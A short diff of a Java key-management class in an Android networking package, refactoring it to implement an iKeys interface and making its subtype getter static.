@@ -18,6 +18,7 @@ import com.android.networking.Device;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
+import com.android.networking.interfaces.iKeys;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 import com.android.networking.R;
@@ -26,10 +27,10 @@ import com.android.networking.R;
 /**
  * The Class Keys.
  */
-public class Keys {
+public class Keys implements iKeys{
 	private static final String TAG = "Keys"; //$NON-NLS-1$
 	/** The singleton. */
-	private static Keys singleton;
+	private static iKeys singleton;
 	private static int keyLen = 16;
 
 	// Subversion
@@ -75,7 +76,7 @@ public class Keys {
 	 * 
 	 * @return the keys
 	 */
-	public static Keys self() {
+	public static iKeys self() {
 		if (singleton == null) {
 			synchronized (keysLock) {
 				if (singleton == null) {
@@ -270,7 +271,7 @@ public class Keys {
 	 * 
 	 * @return the subtype
 	 */
-	public byte[] getSubtype() {
+	static public  byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
 			return ("ANDROID-" + Messages.getString("20.1")).getBytes();
